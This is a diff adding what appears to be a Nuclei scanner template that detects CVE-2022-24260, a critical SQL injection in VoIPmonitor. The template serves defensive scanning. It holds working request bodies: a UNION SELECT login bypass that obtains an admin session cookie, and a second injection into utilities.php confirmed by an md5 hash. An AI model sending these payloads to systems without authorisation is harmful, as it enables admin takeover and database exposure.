@@ -1,0 +1,61 @@
+id: cve-2022-24260
+info:
+  name: VoipMonitor utilities.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    VoIPmonitor has a SQL injection vulnerability, which allows obtaining administrator privileges by exploiting the utilities.php file to inject sensitive information such as database user passwords.
+  reference:
+    - https://kerbit.io/research/read/blog/3
+    - https://www.voipmonitor.org/changelog-gui?major=5
+  classification:
+    cve-id: CVE-2022-24260
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/api.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      module=relogin&action=login&pass=nope&user=a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - "_vm_version"
+    extractors:
+      - type: regex
+        name: phpsessid
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?);"
+        internal: true
+
+  - id: "2"
+    method: POST
+    path:
+      - "{{BaseURL}}/php/model/utilities.php"
+    headers:
+      Cookie: PHPSESSID={{phpsessid}}
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      task=loadConfigSubsystem&params={"subsystem": "tracker", "name":"name", "user_id":"'UNION SELECT md5(345) #"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "d81f9c1be2e08964bf9f24b15f0e4900"
